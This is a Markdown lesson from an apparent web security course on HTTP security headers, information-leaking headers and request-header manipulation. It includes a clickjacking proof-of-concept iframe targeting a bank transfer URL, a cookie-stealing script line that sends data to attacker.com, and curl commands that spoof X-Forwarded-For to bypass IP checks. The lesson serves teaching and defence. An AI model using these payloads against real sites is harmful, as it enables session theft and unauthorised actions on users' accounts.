---
title: "HTTP Headers and Security Headers"
tags: [foundation, web, HTTP-headers, security-headers, info-leakage,
       header-injection, HSTS, X-Frame-Options, CSP, CORS]
module: 01-Foundation-03
day: 18
related_topics:
  - Web Architecture Full Stack (Day 017)
  - Same-Origin Policy and CORS (Day 019)
  - CSP and Web Cache Behaviour (Day 025)
  - HTTP Request Smuggling (Day 026)
---

# Day 018 — HTTP Headers and Security Headers

## Goals

By the end of this lesson you will be able to:

1. Name and explain every major security-relevant HTTP response header.
2. Identify which headers leak information about the server stack and why
   that matters.
3. Explain three attacks that headers enable or prevent: clickjacking,
   MIME sniffing, HSTS bypass.
4. Craft and inject custom request headers to probe server behaviour.
5. Perform a complete header audit of a target site and score it.

---

## Prerequisites

- [Day 005 — HTTP Cookies, Sessions and TLS](../01-Foundation-01/DAY-0005-HTTP-Cookies-Sessions-and-TLS.md)
- [Day 017 — Web Architecture Full Stack](DAY-0017-Web-Architecture-Full-Stack.md)

---

## Main Content — Part 1: Headers That Leak Information

### 1. Information-Disclosure Headers

These headers reveal stack details. Each one is a gift to an attacker
building a target profile.

| Header | Example | What it reveals |
|---|---|---|
| `Server` | `Apache/2.4.41 (Ubuntu)` | Webserver + version + OS |
| `X-Powered-By` | `PHP/7.4.33` | Language + version |
| `X-AspNet-Version` | `4.0.30319` | .NET version |
| `X-AspNetMvc-Version` | `5.2` | ASP.NET MVC version |
| `X-Generator` | `Drupal 9 (https://www.drupal.org)` | CMS + version |
| `X-Runtime` | `0.512` | Rails — confirms Ruby on Rails |
| `X-Drupal-Cache` | `MISS` | Confirms Drupal + cache layer |
| `Via` | `1.1 varnish` | Varnish cache in front |

**Collecting these:**

```bash
# Single target
curl -sI https://target.com/ | grep -iE \
    "server:|x-powered-by:|via:|x-generator:|x-aspnet|x-runtime|x-drupal"

# Multiple endpoints
for path in / /admin /api /wp-admin /phpinfo.php; do
    echo "=== $path ===";
    curl -sI "https://target.com$path" 2>/dev/null | \
        grep -iE "server:|x-powered-by:|x-generator:" ;
done
```

**Hardening:** Remove or obfuscate these headers. In nginx:

```nginx
server_tokens off;                # Hides nginx version
more_clear_headers 'X-Powered-By';  # Remove PHP header
```

---

## Main Content — Part 2: Security Response Headers

### 2. HSTS — HTTP Strict Transport Security

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**What it does:** Tells the browser to always use HTTPS for this domain
for `max-age` seconds. After the first visit, the browser refuses HTTP
and upgrades automatically without making a network request.

**Why it matters:** Prevents SSL stripping attacks (MITM downgrades HTTPS
to HTTP). Once a browser has seen HSTS, an attacker on the network cannot
intercept traffic even with a rogue access point.

**Weaknesses:**
- First-visit (TOFU) problem: the first request is over HTTP before HSTS
  kicks in. Preloading fixes this.
- HSTS without `includeSubDomains`: a MITM can attack `http://sub.domain.com`
  even when `domain.com` is HSTS-protected.

---

### 3. X-Frame-Options / frame-ancestors (Clickjacking)

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
```

**Attack it prevents — Clickjacking:** Attacker embeds the target site in
an `<iframe>` on their page, overlays an invisible layer, and tricks the
user into clicking buttons on the target site.

**Classic clickjacking PoC:**

```html
<!-- attacker.com/clickjack.html -->
<style>
  iframe { opacity: 0.0; position: absolute; top: 0; left: 0;
           width: 500px; height: 300px; z-index: 2; }
  .decoy  { position: absolute; top: 80px; left: 100px;
            font-size: 24px; z-index: 1; }
</style>
<div class="decoy">Click here to win a prize!</div>
<iframe src="https://bank.example.com/transfer?amount=1000&to=attacker">
</iframe>
```

**Testing for missing X-Frame-Options:**

```bash
curl -sI https://target.com/ | grep -i "x-frame\|frame-ancestors"
# Empty response = potentially clickjackable
```

---

### 4. X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

**Attack it prevents — MIME sniffing:** Without this header, browsers will
try to guess the content type of a response regardless of what the server
declares. An attacker who can upload a file and have it served by the target
origin can serve a `text/plain` file containing JavaScript — and old browsers
will execute it.

**Example attack:**
- Upload `evil.txt` containing `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`.
- The server serves it as `Content-Type: text/plain`.
- Without `nosniff`, IE/Edge may interpret it as HTML and execute the script.

---

### 5. Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: no-referrer
```

**What it controls:** How much of the current URL is included in the
`Referer` header when the user clicks a link to another site.

**Why it matters:** Internal URLs, session tokens in URL parameters, and
admin panel paths can leak to third-party analytics and advertising servers
via the `Referer` header.

**Worst case:**

```
# User visits: https://app.com/reset?token=supersecrettoken
# User clicks a link to an ad network
# Referer: https://app.com/reset?token=supersecrettoken
# The ad network now has the password reset token
```

---

### 6. Permissions-Policy (formerly Feature-Policy)

```
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

Controls which browser APIs the page is allowed to use. Blocking camera,
microphone, and geolocation prevents a malicious script (including XSS)
from accessing them even if the user previously granted permissions.

---

## Main Content — Part 3: Request Headers — Attacker Tools

### 7. Request Headers That Change Behaviour

These request headers can alter how the server responds. Manipulating them
is a core web hacking technique.

#### Host Header

```
Host: admin.internal.example.com
```

Used in virtual hosting. The server routes requests to different
applications based on `Host`. Manipulating it:

```bash
# Does the server respond differently to a different Host value?
curl -sk https://1.2.3.4/ -H "Host: internal-admin.corp"
```

**Attack:** Host header injection can poison password reset emails (the
reset link uses `Host` to build the URL), break WAF bypass (hit origin IP
directly with prod `Host`), or access internal virtual hosts.

#### X-Forwarded-For / X-Real-IP

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1, 172.16.0.1
```

Many applications trust these headers to determine client IP for:
- IP-based rate limiting
- Geo-blocking
- IP allow/deny lists

**Attack:**

```bash
# Does the app restrict access by IP? Spoof it:
curl https://target.com/admin -H "X-Forwarded-For: 127.0.0.1"

# Or:
curl https://target.com/admin -H "X-Real-IP: 192.168.1.1"
curl https://target.com/admin -H "X-Originating-IP: 127.0.0.1"
curl https://target.com/admin -H "X-Remote-IP: 127.0.0.1"
```

#### Content-Type

```
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: multipart/form-data; boundary=----
```

Changing `Content-Type` can:
- Switch a JSON endpoint to process XML (opening XXE).
- Change how input is parsed — `a[]=1&a[]=2` is different in PHP vs Ruby.
- Bypass WAF rules that only inspect `application/json`.

#### User-Agent

```
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
User-Agent: sqlmap/1.4 (https://sqlmap.org)
```

- Some applications show debug information to Googlebot.
- Rate limiting sometimes exempts known crawlers.
- WAFs sometimes allow different payloads from trusted UAs.

---

### 8. Complete Header Audit

Use this checklist when auditing a target:

```bash
#!/bin/bash
# Header Security Audit — Ghost Method
TARGET="https://target.example.com"

echo "=== REQUEST ==="
curl -sI "$TARGET"

echo ""
echo "=== SECURITY HEADER ANALYSIS ==="

RESP=$(curl -sI "$TARGET")

check_header() {
    local header="$1"
    local desc="$2"
    if echo "$RESP" | grep -qi "$header"; then
        echo "  [✓] $header: PRESENT"
    else
        echo "  [✗] $header: MISSING — $desc"
    fi
}

check_header "Strict-Transport-Security" \
    "No HSTS — vulnerable to SSL stripping on first visit"
check_header "Content-Security-Policy" \
    "No CSP — XSS mitigation missing"
check_header "X-Frame-Options" \
    "No clickjacking protection (use CSP frame-ancestors instead)"
check_header "X-Content-Type-Options" \
    "MIME sniffing not disabled"
check_header "Referrer-Policy" \
    "URL may leak in Referer header to third parties"
check_header "Permissions-Policy" \
    "Browser API permissions not restricted"

echo ""
echo "=== INFO LEAKAGE ==="
for h in "Server" "X-Powered-By" "X-AspNet-Version" "X-Generator" \
         "X-Runtime" "Via" "X-Drupal"; do
    val=$(echo "$RESP" | grep -i "^${h}:" | head -1)
    [ -n "$val" ] && echo "  [!] INFO LEAK: $val"
done
```

---

## Key Takeaways

1. **Security headers are free defences.** HSTS, `nosniff`, `X-Frame-Options`,
   and `CSP` can be added in nginx/Apache config in minutes. Absence of any of
   them is a finding worth reporting in a bug bounty.
2. **Info-disclosure headers narrow the exploit search space.** `Server:
   Apache/2.4.41` + CVE search = specific exploits to try.
3. **`X-Forwarded-For` spoofing bypasses IP-based security controls.** If
   a rate limiter or admin panel trusts this header, it is trivially bypassed.
4. **The `Host` header controls more than routing.** Password reset links,
   internal virtual host access, and cache poisoning all flow through it.
5. **`Content-Type` manipulation unlocks different parsers.** Changing
   `application/json` to `text/xml` can open XXE on an endpoint that
   didn't look vulnerable.

---

## Exercises

### Exercise 1 — Header Audit

Run the header audit script against three different websites you own or
have permission to test. Score each one: how many security headers are
present vs missing?

### Exercise 2 — X-Forwarded-For Bypass

Set up a simple Flask app (or use DVWA) with IP-based access restriction:

```python
from flask import Flask, request, abort
app = Flask(__name__)

@app.route('/admin')
def admin():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip != '127.0.0.1':
        abort(403)
    return "Welcome to admin panel!"
```

1. Access `/admin` — get 403.
2. Spoof: `curl http://localhost:5000/admin -H "X-Forwarded-For: 127.0.0.1"`
3. Fix the code: only trust `X-Forwarded-For` from known proxy IPs.

### Exercise 3 — Clickjacking Proof of Concept

1. Find a site with a missing `X-Frame-Options` / `frame-ancestors` header.
2. Build the clickjacking PoC from this lesson.
3. Open it in a browser and confirm the iframe renders the target page.
4. Document: what action could be triggered on the target site through this?

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 017 — Web Architecture Full Stack](DAY-0017-Web-Architecture-Full-Stack.md)*
*Next: [Day 019 — Same-Origin Policy and CORS](DAY-0019-Same-Origin-Policy-and-CORS.md)*
